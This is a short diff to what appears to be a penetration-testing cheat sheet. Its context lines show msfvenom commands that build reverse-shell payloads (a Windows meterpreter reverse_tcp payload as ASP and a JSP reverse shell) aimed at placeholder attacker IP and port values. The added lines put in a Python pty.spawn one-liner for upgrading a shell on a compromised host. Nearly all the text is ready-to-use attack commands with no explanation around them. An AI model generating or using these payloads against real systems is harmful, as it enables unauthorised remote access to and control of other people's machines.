@@ -79,3 +79,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > she
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
 ```
+
+
+#### INTERACTIVE SHELL
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
